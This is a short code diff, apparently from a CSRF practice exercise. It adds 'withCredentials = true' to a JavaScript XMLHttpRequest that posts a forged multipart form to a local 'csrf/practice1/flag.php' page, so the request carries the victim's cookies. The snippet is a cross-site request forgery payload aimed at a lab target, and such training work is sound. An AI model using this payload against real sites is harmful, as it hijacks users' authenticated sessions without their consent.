@@ -3,6 +3,7 @@ var xhr = new XMLHttpRequest();
 data='------WebKitFormBoundarypnNoh0sxdPb4ernp\r\nContent-Disposition: form-data; name="file"; filename="x.txt" \r\nContent-Type: text/plain\r\n\r\n\r\n------WebKitFormBoundarypnNoh0sxdPb4ernp--\r\n'
 xhr.open("POST","http://localhost/csrf/practice1/flag.php");
 xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryrYYLq4HkfCAAYZXe");
+xhr.withCredentials = true;
 xhr.onreadystatechange = CallbackFun;
 xhr.send(data);
 function CallbackFun(){
